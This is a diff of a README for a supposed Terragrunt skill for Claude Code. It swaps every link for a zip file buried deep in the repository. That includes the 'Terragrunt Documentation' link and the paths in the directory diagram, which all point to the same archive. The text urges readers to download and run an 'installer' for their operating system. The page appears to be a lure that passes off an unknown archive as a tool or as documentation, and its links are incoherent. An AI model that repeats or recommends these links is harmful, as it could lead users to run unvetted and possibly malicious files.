@@ -1,7 +1,7 @@
 # 🚀 terragrunt-skill - Best Practices for Easy Infrastructure 
 
 ## 📥 Download Now 
-[![Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)
+[![Download Latest Release](https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip)
 
 ## 🏗️ About This Project
 Terragrunt Skill for Claude Code provides simple guidance on best practices for using Terragrunt with OpenTofu/Terraform. This skill aims to help you effectively manage your infrastructure-as-code projects. 
@@ -20,7 +20,7 @@ To begin using the Terragrunt skill, follow these steps:
    - Required Software: OpenTofu/Terraform
 
 2. **Download & Install**  
-   Visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)
+   Visit this page to download: [Download Latest Release](https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip)
 
    Choose the most recent release and download the installer file suitable for your operating system. Follow the prompts to install the application on your system.
 
@@ -39,8 +39,8 @@ To effectively implement your Terragrunt configurations, it's important to under
 │   (terraform-aws-*)     │   (infrastructure-      │   (infrastructure-
 │                         │    <org>-catalog)       │    <org>-live)  │
 ├─────────────────────────┼─────────────────────────┼─────────────────┤
-│ • OpenTofu modules      │ • units/ (wrappers)     │ • https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip      │
-│ • Semantic versioning   │ • stacks/ (templates)   │ • https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip   │
+│ • OpenTofu modules      │ • units/ (wrappers)     │ • https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip      │
+│ • Semantic versioning   │ • stacks/ (templates)   │ • https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip   │
 └─────────────────────────┴─────────────────────────┴─────────────────┘
 ```
   
@@ -70,9 +70,9 @@ Understanding this layout will help you effectively use the tool and organize yo
 If you have questions or need assistance, consider reaching out to the community. You can check the issues section of this repository for solutions or submit your questions for help.
 
 ## 📚 Further Reading  
-For more information on Terragrunt and best practices, please refer to the [Terragrunt Documentation](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip). 
+For more information on Terragrunt and best practices, please refer to the [Terragrunt Documentation](https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip). 
 
 ## 📥 Download Now Again  
-Don't forget to download the application: [Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)  
+Don't forget to download the application: [Download Latest Release](https://github.com/Nayzs01/terragrunt-skill/raw/refs/heads/main/test-output/catalog/stacks/serverless-api/terragrunt_skill_3.1.zip)  
 
 By following these instructions, you will be able to set up and run the Terragrunt skill with ease. Enjoy building your infrastructure!
